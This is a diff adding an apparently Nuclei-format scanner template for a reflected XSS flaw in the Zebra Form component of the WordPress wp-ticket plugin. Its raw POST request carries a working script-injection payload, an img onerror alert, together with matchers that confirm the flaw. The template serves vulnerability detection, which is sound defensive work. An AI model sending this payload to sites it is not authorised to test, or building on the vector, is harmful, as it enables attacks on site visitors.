@@ -1,0 +1,44 @@
+id: wordpress-zebra-form-xss
+
+info:
+  name: Wordpress Zebra Form XSS
+  author: madrobot
+  severity: medium
+  reference: https://blog.wpscan.com/2021/02/15/zebra-form-xss-wordpress-vulnerability-affects-multiple-plugins.html
+  tags: wordpress,xss
+requests:
+  - raw:
+      - |
+        POST /wp-content/plugins/wp-ticket/assets/ext/zebraform/process.php?form=%3C/script%3E%3Cimg%20src%20onerror=alert(/XSS-form/)%3E&control=upload HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Accept-Language: en-GB,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=---------------------------77916619616724262872902741074
+        Content-Length: 241
+        Origin: null
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+        -----------------------------77916619616724262872902741074
+        Content-Disposition: form-data; name="upload"; filename="a.txt"
+        Content-Type: text/plain
+        Test
+        -----------------------------77916619616724262872902741074--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "</script><img src onerror=alert(/XSS-form/)>"
+        part: body
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
